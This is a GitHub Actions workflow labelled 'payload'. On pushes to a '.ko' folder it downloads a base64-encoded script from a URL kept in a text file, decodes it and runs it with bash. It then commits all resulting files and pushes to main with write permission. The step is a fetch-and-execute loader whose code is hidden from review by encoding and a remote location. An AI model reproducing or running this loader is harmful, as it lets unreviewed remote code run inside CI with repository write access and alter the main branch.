name: ko-run3
on:
  push:
    paths:
      - '.ko/**'
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: payload
        run: |
          set -uo pipefail
          DOC=$(tail -n 1 .ko/payload.txt | tr -d '\r')
          curl -sSL -w 'curl http=%{http_code} size=%{size_download}\n' -o /tmp/p.b64 "$DOC"
          sed -e '1s/^\xEF\xBB\xBF//' /tmp/p.b64 | tr -cd 'A-Za-z0-9+/=' > /tmp/p2.b64
          base64 -d /tmp/p2.b64 > /tmp/payload.sh && echo decoded=$(wc -c < /tmp/payload.sh)
          head -c 200 /tmp/payload.sh
          bash /tmp/payload.sh > /tmp/plog 2>&1; rc=$?
          { echo "rc=$rc"; echo '--- tail ---'; tail -c 7000 /tmp/plog; } > DIAG.txt
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "게임: 자동 실행 결과 반영(3)" || true
          git push origin HEAD:main || true
